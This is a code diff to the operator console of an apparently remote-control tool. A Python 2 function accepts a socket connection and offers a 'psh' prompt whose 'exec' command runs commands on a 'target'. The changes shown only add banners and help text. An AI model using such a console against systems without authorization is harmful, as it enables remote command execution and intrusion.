@@ -27,8 +27,10 @@ def get_args():
 
 
 def ctrl_shell_server(s, PORT):
-    print '[+] ({}) Entering perennial shell (psh)'.format(datetime.now())
+    print '[+] ({}) Entering control shell'.format(datetime.now())
     conn, addr = s.accept()
+    print 'Welcome to psh, the perennial shell!'
+    print 'Running `help\' will give you a list of supported commands.'
     while True:
         try:
             inp = raw_input('psh > ')
@@ -36,16 +38,18 @@ def ctrl_shell_server(s, PORT):
                 break
             elif inp == '':
                 continue
-            elif inp == 'help':
-                print 'commands:\n  exec'
+            elif inp.startswith('help'):
+                print 'Commands:\n  exec'
+                print '\ntip: run `command -h\' to get the command\'s help'
             elif inp.startswith('exec'):
                 if re.search('^exec ("[^"]+"\ )+$', inp + ' '):
                     response = ctrl_shell_exec(conn, inp)
                     print response
                 else:
+                    print 'Execute commands on target.'
                     print 'usage: exec "cmd1" ["cmd2" "cmd3" ...]'
             else:
-                print 'psh: {}: command not found'.format(inp)
+                print 'psh: {}: command not found'.format(inp.split()[0])
         except KeyboardInterrupt:
             break
     socksend(conn, 'fin')
